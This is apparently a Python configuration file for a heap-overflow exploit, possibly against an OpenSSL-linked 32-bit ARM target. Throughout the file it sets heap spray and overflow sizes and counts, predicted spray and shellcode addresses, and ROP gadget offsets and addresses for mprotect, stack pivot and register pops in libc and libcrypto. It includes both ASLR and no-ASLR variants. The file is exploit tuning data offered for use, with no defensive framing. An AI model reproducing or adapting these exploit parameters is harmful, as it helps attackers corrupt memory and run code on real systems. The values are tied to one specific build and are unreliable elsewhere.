# -*- coding: UTF-8 -*-
#Heap exploit config

PAGE_SIZE = 0x1000

ROP_CONFIG = \
    {
        # Heap configuration for each unit
        'spray_size': PAGE_SIZE,
        'debug_spray_size': 0x10,
        'overflow_size': 4 * 6,
        'debug_overflow_size': 0x2,
        
        # Heap configuration for Total payload (contain many units)
        # 'spray_count': 0x70e,
        'spray_count': 381-1,
        'overflow_count': 4900,
        #'overflow_count': 0x100,

        # Addresses that we need to predict
        # no aslr
        # 'spray_address': 0xee700008, # ssl_method_ptr_address
        # 'shellcode_address': 0xee700008 + 0x100,

        #aslr
        #'spray_address': 0xee700008, # ssl_method_ptr_address
        #'shellcode_address': 0xee700008 + 0x100,
        'spray_address': 0xf15f1008, # ssl_method_ptr_address
        'shellcode_address': 0xf15f1008 + 0x100,

        # ROP configuration
        'shellcode_offset': 0x100,
        'rop_slide_offset': 0x28,

        'gadgets': \
        {
            # Libc ROP gadgets
            'mprotect': 0x0003d240,
            'stack_pivot': 0x00071268,   # libcripto 
            'pop_pc': 0x00041a37,
            'pop_r0_r1_r2_pc': 0x00027ffd,
            'pop_r4_lr_bx_lr' : 0x00012810,
            
            'libcbase': 0xf76cd000,
            'libcryptobase': 0xf750c000

        }
    }
    
ROP3_CONFIG = \
    {
        # Heap configuration for each unit
        'spray_size': PAGE_SIZE,
        'debug_spray_size': 0x10,
        'overflow_size': 0x18,
        'debug_overflow_size': 0x2,
        
        # Heap configuration for Total payload (contain many units)
        # 'spray_count': 0x70e,
        'spray_count': 0x3e8,
        'overflow_count': 0x222e,

        # Addresses that we need to predict
        'spray_address': 0xee700008, # ssl_method_ptr_address
        'shellcode_address': 0xee700008 + 0x100,

        # ROP configuration
        'shellcode_offset': 0x100,
        'rop_slide_offset': 0x28,

        'gadgets': \
        {
            # Libc ROP gadgets
            'mprotect': 0xf770a240,
            'stack_pivot': 0xf757d268,   # libcripto 
            'pop_pc': 0xf770ea37, #thumb
            'pop_pc_arm': 0xf770ea37, #arm
            'pop_r0_r1_r2_pc': 0xf76f4ffd,
            'pop_r4_lr_bx_lr' : 0xf76df810,
            #'pop_r4_lr_bx_lr' : 0x46464646,
            'libcbase': 0xf76cd000,
            'libcripto': 0xf750c000

        }
    }